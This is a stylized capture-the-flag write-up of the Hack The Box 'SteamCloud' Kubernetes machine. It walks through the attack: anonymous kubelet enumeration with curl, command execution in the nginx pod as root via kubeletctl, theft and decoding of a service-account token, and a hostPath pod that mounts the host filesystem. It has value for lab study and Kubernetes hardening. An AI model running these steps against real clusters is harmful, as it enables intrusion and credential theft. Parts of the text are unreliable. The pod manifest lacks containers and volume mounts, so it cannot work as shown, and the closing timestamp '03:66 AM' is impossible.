# HTB_Steam
My HTB Steam machine writeup.

# 🔮☁️ *STEAMCLOUD* ☁️👻  
#### *"Where Kubernetes Pods Whisper Secrets in the Dark..."*  

---

## 🌫️ **Case File: D22.100.151**  
**Date Discovered**: 24th Dec 2022  
**Classification**: *Kubernetes*  
**Threat Level**: 👹 EASY (but treacherous)  


🕵️‍♂️ Ectoplasmic Enumeration
The spectral scan revealed ghostly services:

PORT	SERVICE	NOTES
:10250	Kubelet	"Anonymous souls may enter..."
:8443	Kubernetes API	"Authentication required (but we'll bypass the veil)"
:2379	etcd	"Where Kubernetes keeps its skeletons"


![1nmap](https://github.com/user-attachments/assets/492cec36-f877-489d-8066-2c23b41624dd)

```bash
# The forbidden curl of revelation
curl https://10.129.96.98:10250/pods -k | jq '.items[].metadata.name'
```

![2 culr kerberos](https://github.com/user-attachments/assets/7d9d22ae-4c4e-441e-a191-358fd088f6cc)


# Output: ["nginx","etcd-steamcloud","..."]
💀 The Haunting (Exploitation)
Phase 1: Possessing the Nginx Vessel

![3 kubelet ports](https://github.com/user-attachments/assets/c0e311e8-4cb9-4838-9931-ed1fe8191fc2)


```bash
kubeletctl exec "id" -p nginx -c nginx
# uid=0(root) gid=0(root) groups=0(root) 👻
```

![4 ngnix vuln](https://github.com/user-attachments/assets/8e30ae36-b57d-412f-98c5-c721d8d67d82)



The container confessed its root secrets under spectral interrogation

Phase 2: Séance with Service Accounts
Stolen artifacts:

ca.crt (The cluster's necronomicon)

![5 export token](https://github.com/user-attachments/assets/1941d447-4014-4695-bd71-34a7ce45b003)

token (A whispering JWT spirit)

```bash
echo $token | cut -d'.' -f2 | base64 -d
```

![6 login](https://github.com/user-attachments/assets/c8c05820-93d2-434d-99cc-348a160670d3)


# {"sub":"system:serviceaccount:default:default"...}
🧟 Necromantic Privilege Escalation
Summoning a Malicious Pod

```yaml
# summon_pod.yaml
apiVersion: v1
kind: Pod 
metadata:
  name: necromancer
spec:
  hostNetwork: true  # Bind to the underworld
  volumes:
    - name: host-root
      hostPath:
        path: /      # The path to damnation
```

```bash
kubectl apply -f summon_pod.yaml
# pod/necromancer created (the ritual worked!)
```

Communing with the Host Spirit

```bash
kubeletctl exec "ls /host/root" -p necromancer -c necromancer
# root.txt  (THE PHYLACTERY!)
```

👁️ Prophecies (Flags)
FLAG	LOCATION	INCANTATION
User	/host/home/user/user.txt	d3d944... (The Screaming Code)
Root	/host/root/root.txt	5f4dcc... (The Cursed Hash)
🧪 Arcane Knowledge Gained
How to commune with the Kubelet afterlife

The dark art of hostPath mounting

Why you should never leave 10250 unsecured

+ EXORCISM COMPLETE: Cluster secured at 03:66 AM
"This machine was a ghost story about misconfigured Kubernetes...
...and like all good ghost stories, it ended with stolen credentials."
- The Cloud Necromancer's Handbook
